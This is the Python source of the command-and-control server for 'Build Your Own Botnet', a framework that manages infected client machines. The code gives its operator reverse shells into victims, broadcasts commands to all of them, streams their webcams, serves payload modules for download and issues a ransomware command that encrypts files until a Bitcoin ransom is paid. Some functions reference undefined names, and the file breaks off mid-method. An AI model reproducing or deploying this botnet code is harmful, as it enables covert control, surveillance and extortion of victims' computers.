#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""

from __future__ import print_function

# standard library

import os
import sys
import json
import time
import Queue
import pickle
import socket
import struct
import base64
import random
import select
import logging
import requests
import colorama
import argparse
import datetime
import functools
import cStringIO
import threading
import subprocess
import collections

# external

import cv2
import numpy
import configparser
import SocketServer
import mysql.connector


# modules

try:
    from modules import security, util
except ImportError:
    try:
        from . import security, util
    except ImportError:
        pass



# globals

_debug   = True

_abort   = False

_threads = collections.OrderedDict()

_rootdir = os.getcwd()

colorama.init(autoreset=True)



# decorators

def threaded(function):
    """
    Decorator for making a function threaded
    """
    @functools.wraps(function)
    def _threaded(*args, **kwargs):
        t = threading.Thread(target=function, args=args, kwargs=kwargs, name=time.time())
        t.daemon = True
        t.start()
        return t
    return _threaded



# classes

class TaskHandler(SocketServer.StreamRequestHandler):
    """
    Task Handler (Build Your Own Botnet)
    
    """

    def handle(self):
        while True:
            try:
                bits = self.connection.recv(4)
                if len(bits) < 4:
                    break
                size = struct.unpack('>L', bits)[0]
                buff = self.connection.recv(size)
                while len(buff) < size:
                    buff += self.connection.recv(size - len(buff))
                data = pickle.loads(buff)
                task = logging.makeLogRecord(data)
                globals()['_threads']['server'].database.handle_task(task.__dict__)
            except Exception as e:
                logging.error(str(e))


class TaskServer(SocketServer.ThreadingTCPServer):
    """
    Task Server (Build Your Own Botnet)
    
    """
    
    allow_reuse_address = True

    def __init__(self, host='0.0.0.0', port=1338, handler=TaskHandler):
        SocketServer.ThreadingTCPServer.__init__(self, (host, port), handler)
        self.timeout  = 1.0

    def serve_until_stopped(self):
        while True:
            rd, wr, ex = select.select([self.socket.fileno()], [], [], self.timeout)
            if rd:
                self.handle_request()
            abort = globals()['_abort']
            if abort:
                break
            


class Database(mysql.connector.MySQLConnection):
    
    """
    Database (Build Your Own Botnet)
    
    """

    def __init__(self, **kwargs):

        """
        connect to MySQL and setup the database
            keyword arguments:
                host        hostname/IP address of MySQL host machine
                user        authorized account username
                password    authorized account password
                database    name of the MySQL database to use

        """
        super(Database, self).__init__(**kwargs)
        self.setup()
        self.config(**kwargs)
        self.query = self.cursor(dictionary=True)
        self.tasks = collections.OrderedDict()
        self.color = util.color()

    def setup(self):
        try:
            with open('resources/setup.sql', 'r') as fd:
                sql = fd.read().replace('{user}', self.user).replace('{host}', self.server_host)
                self.execute_file(sql)
            return True
        except Exception as e:
            util.debug(e)
        return False

    def _display(self, data, indent=4):
        if isinstance(data, dict):
            for k,v in data.items():
                if isinstance(v, datetime.datetime):
                    data[k] = v.ctime()
            i = data.pop('id',None)
            print(colorama.Style.BRIGHT + colorama.Fore.RESET + str(i).rjust(indent-3)) if i else None
            for k,v in data.items():
                if isinstance(v, unicode):
                    try:
                        j = json.loads(v.encode())
                        self._display(j, indent+2)
                    except:
                        print(colorama.Style.BRIGHT + self.color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
                elif isinstance(v, list):
                    for i in v:
                        if isinstance(v, dict):
                            print(colorama.Style.BRIGHT + self.color + str(k).ljust(4  * indent).center(5 * indent))
                            self._display(v, indent+2)
                        else:
                            print(colorama.Style.BRIGHT + self.color + str(i).ljust(4  * indent).center(5 * indent))
                elif isinstance(v, dict):
                    print(colorama.Style.BRIGHT + self.color + str(k).ljust(4  * indent).center(5 * indent))
                    self._display(v, indent+1)
                elif isinstance(v, int):
                    if v in (0,1):
                        print(colorama.Style.BRIGHT + self.color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(bool(v)).encode())
                    else:
                        print(colorama.Style.BRIGHT + self.color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
                else:
                    print(colorama.Style.BRIGHT + self.color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
        elif isinstance(data, list):
            for row in data:
                if isinstance(row, dict):
                    self._display(row, indent+2)
                else:
                    print(colorama.Style.BRIGHT + self.color + str(row).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())

        else:
            if hasattr(data, '_asdict'):
                data = data._asdict()
            if isinstance(data, collections.OrderedDict):
                data = dict(data)
            if isinstance(data, dict):
                i = data.pop('id',None)
                print(colorama.Style.BRIGHT + colorama.Fore.RESET + str(i).rjust(indent-1)) if i else None
                self._display(data, indent+2)

            else:
                print(colorama.Style.BRIGHT + self.color + str(data.encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + v.encode()))


    def _reconnect(self):
        try:
            self.reconnect()
            self.query = self.cursor(dictionary=True)
            return True
        except Exception as e:
            util.debug("{} error: {}".format(self._reconnect.func_name, str(e)))
        return False


    def client_online(self, client_id):
        """
        Set client status as online
        """
        try:
            if isinstance(client_id, str):
                self.execute_query("UPDATE tbl_clients SET online=1 WHERE uid='%s'" % str(client_id))
                return True
            elif isinstance(client_id, int):
                self.execute_query("UPDATE tbl_clients SET online=1 WHERE id=%d" % int(client_id))
                return True
            else:
                util.debug("{} error: invalid input type (expected {}, received {})".format(self.offline_client.func_name, list, type(client_id)))
        except Exception as e:
            util.debug("{} error: {}".format(self.offline_client.func_name, str(e)))
        return False


    def client_offline(self, client_id):
        """
        Set client status as offline
        """
        try:
            if isinstance(client_id, str):
                self.execute_query("UPDATE tbl_clients SET online=0, last_online=NOW() WHERE uid='%s'" % str(client_id))
                return True
            elif isinstance(client_id, int):
                self.execute_query("UPDATE tbl_clients SET online=0, last_online=NOW() WHERE id=%d" % int(client_id))
                return True
            else:
                util.debug("{} error: invalid input type (expected {}, received {})".format(self.offline_client.func_name, list, type(client_id)))
        except Exception as e:
            util.debug("{} error: {}".format(self.offline_client.func_name, str(e)))
        return False


    def client_remove(self, client_id):
        """
        Remove client from database
        """
        try:
            if isinstance(client_id, str):
                self.execute_query("DELETE FROM tbl_clients WHERE id='%s'" % task_id)
            elif isinstance(client_id, int):
                self.execute_query("DELETE FROM tbl_clients WHERE id=%d" % client_id)
            else:
                util.debug("{} error: invalid input type (expected {}, received {})".format(self.client_remove.func_name, list, type(client_id)))
        except Exception as e:
            util.debug("{} error: {}".format(self.client_remove.func_name, str(e)))


    def get_clients(self, verbose=False, display=False):
        """
        Return json list of clients
        """
        clients = self.execute_query("SELECT * FROM tbl_clients ORDER BY online" if verbose else "SELECT id, public_ip, uid, last_online FROM tbl_clients ORDER BY online desc")   
        if display:
            self._display(clients)
        return clients


    def get_tasks(self, client_id=None, display=True):
        """
        Get any/all clients task results
        """
        try:
            tasks = None
            if client_id:
                try:
                    tasks = self.execute_query("SELECT * FROM tbl_tasks WHERE client='{}'".format(client_id), display=False)
                except Exception as e:
                    util.debug("{} error: {}".format(self.show_results.func_name, str(e)))
            else:
                try:
                    tasks = self.execute_query("SELECT * FROM tbl_tasks", display=False)
                except Exception as e:
                    util.debug("{} error: {}".format(self.show_results.func_name, str(e)))
            if tasks:
                if display:
                    self._display(tasks)
                return tasks
        except Exception as e:
            util.debug("{} error: {}".format(self.get_tasks.func_name, str(e)))

    def handle_client(self, info):
        """
        Handle a new/current client by adding/updating database
        """
        if isinstance(info, dict):
            args = (json.dumps(info), '@client')
            _ = self.execute_procedure('sp_handle_client', args=args, display=False)
            data = self.execute_query('SELECT @client', display=False)
            if isinstance(data, list) and len(data):
                data = data[0]
            if isinstance(data, dict):
                info = data
                if 'uid' in info:
                    if info['uid'] not in self.tasks:
                        self.tasks[info['uid']] = []
                return info
            else:
                util.debug("Error: invalid output type returned from database (expected '{}', receieved '{}')".format(dict, type(data)))
        else:
            util.debug("Error: invalid output type returned from database (expected '{}', receieved '{}')".format(dict, type(info)))

    def handle_task(self, task):
        """ 
        Adds results to database for configured task type
        """
        try:
            if not isinstance(task, dict):
                try:
                    task = json.loads(str(task))
                except:
                    pass
            if isinstance(task, dict):
                args = (json.dumps(task), '@row')
                _ = self.execute_procedure("sp_handle_task", args=args)
                task_id = self.execute_query("SELECT @row")
                self.tasks[task['client']].append(task_id)
                return task_id
            else:
                util.debug("{} error: invalid input type (expected {}, received {})".format(self.handle_task.func_name, dict, type(task)))
        except Exception as e:
            util.debug("{} error: {}".format(self.handle_task.func_name, str(e)))


    def set_tasks(self, tasks):
        """
        Set types of task results for database to store
        """
        if isinstance(tasks, list) or isinstance(tasks, set):
            self._store_tasks = tasks
        elif isinstance(tasks, dict):
            self._store_tasks = [task for task,value in tasks.items() if value]
        else:
            util.debug("{} error: argument 'tasks' must be type {}".format(self.set_tasks.func_name, list))


    def execute_query(self, query, display=False):
        """
        Execute a query and return result, optionally printing output to stdout
        """
        result = []
        try:
            if not self.is_connected():
                self._reconnect()
            result = []
            self.query.execute(query)
            output = self.query.fetchall()
            if output:
                for row in output:
                    if hasattr(row, '_asdict'):
                        row = row._asdict()
                    for key,value in [(key,value) for key,value in row.items() if isinstance(value, datetime.datetime)]:
                        row[key] = value.ctime()
                    if display:
                        self._display(row)
                    result.append(row)
        except (mysql.connector.ProgrammingError, mysql.connector.InterfaceError) as e:
            util.debug(e)
        except Exception as e:
            util.debug("{} error: {}".format(self.execute_query.func_name, str(e)))
        finally:
            return result


    def execute_procedure(self, procedure, args=[], display=False):
        """
        Execute a stored procedure and return result, optionally printing output to stdout
        """
        result = []
        try:
            if not self.is_connected():
                self._reconnect()
            cursor = self.cursor(dictionary=True)
            cursor.callproc(procedure, args)
            result = [row for row in cursor.stored_results() for row in result.fetchall()]
        except (mysql.connector.InterfaceError, mysql.connector.ProgrammingError):
            pass
        finally:
            return result


    def execute_file(self, filename=None, sql=None, display=False):
        """
        Execute SQL commands sequentially from a string or file
        """
        try:
            result = []
            if os.path.isfile(filename):
                with open(filename) as stmts:
                    for line in self.query.execute(stmts.read(), multi=True):
                        result.append(line)
                        if display:
                            print(line)
            elif isinstance(sql, str):
                for line in self.query.execute(sql, multi=True):
                    result.append(line)
                    if display:
                        print(line)
            elif isinstance(sql, list) or isinstance(sql, tuple):
                sql = '\n'.join(sql)
                for line in self.query.execute_query(sql, multi=True):
                     result.append(line)
                     if display:
                         print(line)
            return result
        except Exception as e:
            print("{} error: {}".format(self.execute_file.func_name, str(e)))



class Server(threading.Thread):

    """
    Command & Control Server (Build Your Own Botnet)
    
    """

    def __init__(self, host='localhost', port=1337, config=None):
        """
        create a new Server instance
            keyword arguments:
                host        host IP address of server
                port        port number for server to listen on
                config      file path of API key configuration file
            
        """
        super(Server, self).__init__()
        self._prompt        = None
        self._count         = 1
        self._lock          = threading.Lock()
        self._active        = threading.Event()
        self._text_color    = util.color()
        self._text_style    = colorama.Style.DIM
        self._prompt_color  = colorama.Fore.RESET
        self._prompt_style  = colorama.Style.BRIGHT
        self._commands      = {
            'help'          :   self.help,
            'exit'          :   self.quit,
            'quit'          :   self.quit,
            'query'         :   self.query,
            '$'             :   self.debug,
            'debug'         :   self.debug,
            'settings'      :   self.settings,
            'options'       :   self.settings,
            'clients'       :   self.client_list,
            'client'        :   self.client_shell,
            'ransom'        :   self.client_ransom,
            'webcam'        :   self.client_webcam,
            'kill'          :   self.client_remove,
            'back'          :   self.client_background,
            'bg'            :   self.client_background,
            'sendall'	    :   self.task_broadcast,
            'broadcast'     :   self.task_broadcast,
            'results'       :   self.task_list,
            'tasks'         :   self.task_list
            }
        self.current_client = None
        self.host           = host
        self.port           = port
        self.name           = time.time()
        self.clients        = collections.OrderedDict()
        self.config         = self._config(config)
        self.database       = self._database()
        

    def _server_prompt(self, data):
        with self._lock:
            return raw_input(self._prompt_color + self._prompt_style + '\n' + bytes(data).rstrip())

    def _config(self, conf):
        config = configparser.ConfigParser()
        if isinstance(conf, str):
            if os.path.isfile(conf):
                config.read(conf)
        return config


    def _error(self, data):
        util.debug(str(data))
        if self.current_client:
            with self.current_client._lock:
                print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Error: ' + data + '\n')
        else:
            with self._lock:
                print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Error: ' + data + '\n')


    def _kill(self):
        for _ in globals()['_threads']:
            if isinstance(_, subprocess.Popen):
                _.terminate()
                del _
            else:
                del _


    def _print(self, info):
        lock = self._lock if not self.current_client else self.current_client._lock
        if isinstance(info, str):
            try:
                info = json.loads(info)
            except: pass
        if isinstance(info, dict):
            max_key = int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) if int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) < 80 else 80
            max_val = int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) if int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) < 80 else 80
            key_len = {len(str(i2)): str(i2) for i2 in info.keys() if i2 if i2 != 'None'}
            keys    = {k: key_len[k] for k in sorted(key_len.keys())}
            with lock:
                for key in keys.values():
                    if info.get(key) and info.get(key) != 'None':
                        if len(str(info.get(key))) > 80:
                            info[key] = str(info.get(key))[:77] + '...'
                        info[key] = str(info.get(key)).replace('\n',' ') if not isinstance(info.get(key), datetime.datetime) else str(v).encode().replace("'", '"').replace('True','true').replace('False','false') if not isinstance(v, datetime.datetime) else str(int(time.mktime(v.timetuple())))
                        print('\x20' * 4 + self._text_color + self._text_style + key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2))
        else:
            with lock:
                print('\x20' * 4 + self._text_color + self._text_style + str(info))


    def _return(self, data=None):
        if not self.current_client:
            with self._lock:
                if data:
                    print('\n' + data + '\n')
                else:
                    print(self._prompt, end="")
        else:
            with self.current_client._lock:
                if data:
                    print('\n' + data + '\n')
                else:
                    print(self.current_client._prompt, end="")


    def _database(self):
        db = None
        os.chdir(globals()['_rootdir'])
        with self._lock:
            print(util.color() + colorama.Style.BRIGHT + "\n\n" + str(open('resources/banner.txt').read() if os.path.isfile('resources/banner.txt') else ''))
            print(colorama.Fore.RESET + colorama.Style.DIM + '{:>40}\n{:>25}\n'.format('Build Your Own Botnet','v0.1.2'))
            print(colorama.Fore.YELLOW + colorama.Style.BRIGHT + "[?] " + colorama.Fore.RESET + colorama.Style.DIM + "Hint: show usage information with the 'help' command\n")
        if self.config.has_section('database'):
            try:
                db = Database(**dict(self.config['database']))
                with self._lock:
                    print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Connected to database: " + colorama.Style.BRIGHT + self.config['database'].get('database'))
            except:
                db = Database()
                max_v = max(map(len, self.config['database'].values())) + 2
                with self._lock:
                    print(colorama.Fore.RED + colorama.Style.BRIGHT + "[-] " + colorama.Fore.RESET + colorama.Style.DIM + "Error: unable to connect to the currently configured MySQL database\n\thost: %s\n\tuser: %s" % ('\x20' * 4 + ' ' * 4 + self.config['database'].get('host').rjust(max_v), '\x20' * 4 + ' ' * 4 + self.config['database'].get('user').rjust(max_v).rjust(max_v)))
        else:
            try:
                db = Database()
            except:
                db = Database()
                max_v = max(map(len, self.config['database'].values())) + 2
                with self._lock:
                    print(colorama.Fore.RED + colorama.Style.BRIGHT + "[-] " + colorama.Fore.RESET + colorama.Style.DIM + "Error: unable to connect to the currently configured MySQL database\n\thost:  %s\n\tuser: %s" % ('\x20' * 4 + ' ' * 4 + self.config['database'].get('host').rjust(max_v), '\x20' * 4 + ' ' * 4 + self.config['database'].get('user').rjust(max_v).rjust(max_v)))
        return db


    def _get_client_by_id(self, client_id):
        client = None
        if str(client_id).isdigit() and int(client_id) in self.clients:
            client = self.clients[int(client_id)]
        elif self.current_client:
            client = self.current_client
        else:
            self._error("Invalid Client ID")
        return client


    def _get_client_by_connection(self, connection):
        client = None
        if isinstance(connection, socket.socket):
            _addr = connection.getpeername()
            for c in self.get_clients():
                if c._socket.getpeername() == _addr:
                    client = c
                    break
        else:
            self._error("Invalid input type (expected '{}', received '{}')".format(socket.socket, type(connection)))
        return client


    @util.threaded
    def handle_clients(self, sock=None):
        if not sock:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((self.host, self.port))
            sock.listen(10)
        while True:
            conn, addr = sock.accept()
            client  = Client(conn, name=self._count)
            self.clients[self._count] = client
            self._count  += 1
            client.start()                        
            if not self.current_client:
                with self._lock:
                    print(self._prompt_color + self._prompt_style + str("[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd()), end="")
            else:
                if self.current_client._prompt:
                    self.display(str(self.current_client._prompt) % int(self.current_client.name), end="")

            
    @util.threaded
    def handle_tasks(self, port=None):
        try:
            if not port:
                port    = self.port + 1
            task_server = TaskServer(port=port)
            task_server.serve_until_stopped()
        except Exception as e:
            self._error(str(e))
            

    def handle_packages(self, port=None):
        try:
            if not port:
                port    = self.port + 2
            dirname = os.path.join(globals()['_rootdir'], 'packages')
            return subprocess.Popen([sys.executable, '-m', 'SimpleHTTPServer', str(port)], 0, None, None, subprocess.PIPE, subprocess.PIPE, cwd=dirname, shell=True)
        except Exception as e:
            self._error(str(e))


    def handle_modules(self, port=None):
        try:
            if not port:
                port    = self.port + 3
            dirname = os.path.join(globals()['_rootdir'], 'modules')
            return subprocess.Popen([sys.executable, '-m', 'SimpleHTTPServer', str(port)], 0, None, None, subprocess.PIPE, subprocess.PIPE, cwd=dirname, shell=True)
        except Exception as e:
            self._error(str(e))
            

    def debug(self, code):
        """
        Debugger - runs code in context of the server
        """
        if globals()['_debug']:
            try:
                return eval(code)
            except Exception as e:
                self._error(str(e))
        else:
            self._error("debugging mode is disabled")


    def quit(self):
        """
        Quit server and optionally keep clients alive
        """
        if self._server_prompt('Quiting server - keep clients alive? (y/n): ').startswith('y'):
            for client in self.clients.values():
                client._active.set()
                self.task_send('passive', client_id=client.name)
        globals()['_abort'] = True
        self._active.clear()
        _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name is 'nt' else "kill -9 {}".format(os.getpid())).read()
        self.display('Exiting...')
        sys.exit(0)


    def help(self, info=None):
        """
        Show usage information
        """
        column1 = 'command <arg>'
        column2 ='description'
        info    = info if info else {"back": "background the current client", "client <id>": "interact with client via reverse shell", "clients": "list current clients", "exit": "exit the program but keep clients alive", "sendall <command>": "send a command to all connected clients", "settings <value> [options]": "list/change current display settings"}
        max_key = max(map(len, info.keys() + [column1])) + 2
        max_val = max(map(len, info.values() + [column2])) + 2
        print('\n' + self._text_color + colorama.Style.BRIGHT + column1.center(max_key) + column2.center(max_val))
        for key in sorted(info):
            print(self._text_color + self._text_style + key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2))


    def display(self, info):
        """
        Display formatted output in the console
        """
        with self._lock:
            print('\n')
            if isinstance(info, dict):
                if len(info):
                    self._print(info)
            elif isinstance(info, list):
                if len(info):
                    for data in info:
                        print(self._text_color + colorama.Style.BRIGHT + '  %d\n' % int(info.index(data) + 1), end="")
                        self.display(data)
            elif isinstance(info, str):
                try:
                    self._print(json.loads(info))
                except:
                    print(self._text_color + self._text_style + str(info))
            else:
                self._error("invalid data type - input should be in JSON format")


    def query(self, stmt):
        """
        Query the database
        """
        try:
            _= self.database.execute_query(stmt, display=True)
        except Exception as e:
            self._error(str(e))
    

    def settings(self, args=None):
        """
        Settings - text, prompt | Options - color, style 
        """
        if not args:
            try:
                text_color   = [color for i in [getattr(c.Fore, color) for color in ['BLUE','CYAN','RED','BLACK','MAGENTA','GREEN']] if i == self._text_color][0]
                text_style   = [style for i in [getattr(c.Style, style) for style in ['DIM','BRIGHT','NORMAL']] if i == self._text_style][0]
                prompt_color = [color for i in [getattr(c.Fore, color) for color in ['BLUE','CYAN','RED','BLACK','MAGENTA','GREEN']] if i == self._prompt_color][0]
                prompt_style = [style for i in [getattr(c.Style, style) for style in ['DIM','BRIGHT','NORMAL']] if i == self._prompt_style][0]
            except Exception as e:
                return '{} error: {}'.format(self.settings.func_name, str(e))
            print("\n")
            print(colorama.Fore.RESET + colorama.Style.BRIGHT + "Settings".center(40))
            print(colorama.Fore.RESET + colorama.Style.DIM + 'text color/style: {}'.format(' '.join(text_color, text_style).center(40)))
            print(colorama.Fore.RESET + colorama.Style.DIM + 'prompt color/style: {}'.format(' '.join(prompt_color, prompt_style).center(40)))
            print(colorama.Fore.RESET + colorama.Style.DIM + 'debug: {}'.format('true' if globals()['_debug'] else 'false'))
            print(self._text_color + self._text_style)
        else:
            target, _, options = args.partition(' ')
            setting, _, option = options.partition(' ')
            option = option.upper()
            print(self._text_color + self._text_style)
            if target == 'prompt':
                if setting == 'color':
                    if not hasattr(colorama.Fore, option):
                        print("usage: settings prompt color [value]\ncolors:   white/black/red/yellow/green/cyan/magenta")
                    self._prompt_color = getattr(colorama.Fore, option)
                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "prompt color changed to " + self._prompt_color + self._prompt_style + option)
                elif setting == 'style':
                    if not hasattr(colorama.Style, option):
                        print("usage: settings prompt style [value]\nstyles:   bright/normal/dim")
                    self._prompt_style = getattr(colorama.Style, option)
                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "prompt style changed to " + self._prompt_color + self._prompt_style + option)
                else:
                    print("usage: settings prompt <option> [value]")
            elif target == 'text':
                if setting == 'color':
                    if not hasattr(colorama.Fore, option):
                        print("usage: settings text color [value]\ncolors:     white/black/red/yellow/green/cyan/magenta")
                    self._text_color = getattr(colorama.Fore, option)
                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "text color changed to " + self._text_color + self._text_style + option)
                elif setting == 'style':
                    if not hasattr(colorama.Style, option):
                        print("usage: settings text style [value]\nstyles:     bright/normal/dim")
                    self._text_style = getattr(colorama.Style, option)
                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "text style changed to " + self._text_color + self._text_style + option)
                else:
                    print("usage: settings text <option> [value]")
            elif target == 'debug':
                if setting.lower() in ('true', 'on'):
                    globals()['_debug'] = True
                elif settings.lower() in ('false', 'off'):
                    globals()['_debug'] = False
                else:
                    print("usage: settings debug <on/off> (or true/false)")
            else:
                print('\nDisplay Settings\n\n  usage:  settings <type> <option> <color|style>\n  \n    type   - text, prompt\n    option - color, style\n    color  - black, white, blue, red, green, magenta, yellow\n    style  - dim, normal, bright\n\nDebugging Mode\n\t\n  usage: settings debug <on|off>\n')


    def task_send(self, command, client_id=None, connection=None):
        """
        Send command to a client as a standard task
        """
        client = None
        if client_id:
            client = self._get_client_by_id(client_id)
        elif connection:
            client = self._get_client_by_connection(connection)
        else:
            self._error("missing required argument 'client_id' or 'connection'")
            
        if client:
            try:
                task    = {'client': client.info['uid'], 'command': command}
                task_id = self.database.handle_task(task)
                data    = security.encrypt_aes(json.dumps(task), client.key)
                sock.sendall(struct.pack(">L", len(data))+data)
                client._socket.sendall(data)
            except Exception as e:
                time.sleep(1)
                self._error(str(e))


    def task_recv(self, client_id=None, connection=None):
        """
        Listen for incoming task results from a client
        """
        client = None
        if client_id:
            client = self._get_client_by_id(client_id)
        if connection:
            client = self._get_client_by_connection(connection)
        if client:
            try:
                header_size = struct.calcsize("L")
                header      = client._socket.recv(header_size)
                msg_size    = struct.unpack(">L", header)[0]
                msg         = ""
                while len(msg) < msg_size:
                    msg += client._socket.recv(1)
                if msg:
                    try:
                        data = security.decrypt_aes(msg, client.key)
                        try:
                            return json.loads(data)
                        except Exception as e:
                            util.debug(e)
                    except Exception as e1:
                        util.debug(str(e1))
            except Exception as e:
                self._error(str(e))
                time.sleep(1)
                client._active.clear()
                self.client_remove(client.name)
                self._active.set()
                self.run()
        else:
            self._error('failed to receive incoming message from client')


    def task_list(self, client_id=None):
        """
        List tasks and results for a client or all clients
        """
        uid = None
        if client_id:
            return self.database.get_tasks(self._get_client_by_id(client_id).info.get('uid'))
        elif self.current_client:
            return self.database.get_tasks(self.current_client.info.get('uid'))
        else:
            return self.database.get_tasks()


    def task_broadcast(self, msg):
        """
        Broadcast a new task to send it to all clients
        """
        for client in self.clients.values():
            try:
                self.task_send(msg, client_id=client.name)
            except Exception as e:
                self._error(str(e))


    def client_webcam(self, args=''):
        """
        Interact with a client webcam - image | video | stream
        """
        try:
            if not self.current_client:
                self._error("no client selected")
                return
            client = self.current_client
            result = ''
            mode, _, arg = args.partition(' ')
            client._active.clear()
            if not mode or str(mode).lower() == 'stream':
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                retries = 5
                while retries > 0:
                    try:
                        port = random.randint(6000,9999)
                        s.bind(('0.0.0.0', port))
                        s.listen(1)
                        cmd = 'webcam stream {}'.format(port)
                        self.task_send(cmd, client.name)
                        conn, addr  = s.accept()
                        break
                    except:
                        retries -= 1
                header_size = struct.calcsize("L")
                window_name = addr[0]
                cv2.namedWindow(window_name)
                data = ""
                try:
                    while True:
                        while len(data) < header_size:
                            data += conn.recv(4096)
                        packed_msg_size = data[:header_size]
                        data = data[header_size:]
                        msg_size = struct.unpack(">L", packed_msg_size)[0]
                        while len(data) < msg_size:
                            data += conn.recv(4096)
                        frame_data = data[:msg_size]
                        data = data[msg_size:]
                        frame = pickle.loads(frame_data)
                        cv2.imshow(window_name, frame)
                        key = cv2.waitKey(70)
                        if key == 32:
                            break
                finally:
                    conn.close()
                    cv2.destroyAllWindows()
                    result = 'Webcam stream ended'
            else:
                self.task_send("webcam %s" % args, client.name)
                task    = self.task_recv(client_id=client.name)
                result  = task.get('result')
            if result:
                self.display(result)
        except Exception as e:
            util.debug("webcam stream failed with error: {}".format(str(e)))



    def client_remove(self, client_id):
        """
        Shutdown client shell and remove client from database
        """
        try:
            client = self._get_clients_by_id(client_id)
            client._active.clear()
            self.task_send('kill', client_id=client_id)
            try:
                client._socket.close()
            except: pass
            try:
                client._socket.shutdown()
            except: pass
            _ = self.clients.pop(int(client_id), None)
            if not self.current_client:
                with self._lock:
                    print(self._text_color + self._text_style + 'Client {} disconnected'.format(client_id))
                self._active.set()
                client._active.clear()
                return self.run()
            elif int(client_id) == self.current_client.name:
                with self.current_client._lock:
                    print(self._text_color + self._text_style + 'Client {} disconnected'.format(client_id))
                self._active.clear()
                self.current_client._active.set()
                return self.current_client.run()
            else:
                with self._lock:
                    print(self._text_color + self._text_style + 'Client {} disconnected'.format(client_id))
                self._active.clear()
                self.current_client._active.set()
                return self.current_client.run()
        except Exception as e:
            self._error('{} failed with error: {}'.format(self.client_remove.func_name, str(e)))


    def client_list(self, args=None):
        """
        List currently online clients and/or all clients
        """
        args    = str(args).split()
        verbose = bool('-v' in args or '--verbose' in args)
        lock    = self._lock if not self.current_client else self.current_client._lock
        with lock:
            print('\n')
            clients = self.database.get_clients(verbose=verbose, display=True)
            print('\n')


    def client_ransom(self, args=None):
        """
        Encrypt the files on a client host machine and decrypt the files if the user pays a ransom in Bitcoin
        """
        if self.current_client:
            if 'decrypt' in str(args):
                self.task_send("ransom decrypt %s" % key.exportKey(), client_id=self.current_client.name)
            elif 'encrypt' in str(args):
                self.task_send("ransom %s" % args, client_id=self.current_client.name)
            else:
                self._error("invalid option '%s'" % args)
        else:
            self._error("No client selected")


    def client_shell(self, client_id):
        """
        Interact with a client through a reverse TCP shell
        """
        if not str(client_id).isdigit() or int(client_id) not in self.clients:
            self._error("Client '{}' does not exist".format(client_id))
        else:
            self._active.clear()
            if self.current_client:
                self.current_client._active.clear()
            self.current_client = self.clients[int(client_id)]
            print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "\n\n\t[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Client {} selected".format(client.name) + self._text_color + self._text_style)
            self.current_client._active.set()
            return self.current_client.run()


    def client_background(self, client_id=None):
        """
        Send a client to background
        """
        if not client_id:
            if self.current_client:
                self.current_client._active.clear()
        elif str(client_id).isdigit() and int(client_id) in self.clients:
            self.clients[int(client_id)]._active.clear()
        self.current_client = None
        self._active.set()


    def run(self):
        self._active.set()
        globals()['_threads']['task_handler']    = self.handle_tasks()
        globals()['_threads']['client_handler']  = self.handle_clients()
        globals()['_threads']['module_handler']  = self.handle_modules()
        globals()['_threads']['package_handler'] = self.handle_packages()
        while True:
            try:
                self._active.wait()
                self._prompt = "[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd()
                cmd_buffer   = self._server_prompt(self._prompt)
                if cmd_buffer:
                    output = ''
                    cmd, _, action  = cmd_buffer.partition(' ')
                    if cmd in self._commands:
                        try:
                            output  = self._commands[cmd](action) if len(action) else self._commands[cmd]()
                        except Exception as e1:
                            output  = str(e1)
                    elif cmd == 'cd':
                        os.chdir(action)
                    else:
                        try:
                            output = subprocess.check_output(cmd_buffer, shell=True)
                        except: pass
                    if output:
                        self.display(str(output))
                if globals()['_abort']:
                    self._kill()
                    break
            except KeyboardInterrupt:
                break
        print('Server shutting down')
        sys.exit(0)



class Client(threading.Thread):

    """
    Client (Build Your Own Botnet)
    
    """

    def __init__(self, sock, name=None):
        """
        create a new client instance 
            sock    socket.socket object with active connection
            name    integer representing client for quickly selecting in console
        """
        super(Client, self).__init__()
        self._prompt    = None
        self._socket    = sock
        self._active    = threading.Event()
        self._created   = time.time()
        self.name       = name
        self.key        = security.diffiehellman(self._socket)
        self.info       = self._info()


    def _error(self, data):
        with globals()['_threads']['server']._lock:
            print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Client {} Error: '.format(self.name) + bytes(data) + '\n')


    def _kill(self):
        self._active.clear()
        globals()['_threads']['server'].client_remove(self.name)
        globals()['_threads']['server'].current_client = None
        globals()['_threads']['server']._active.set()
        globals()['_threads']['server'].run()


    def _info(self):
        try:
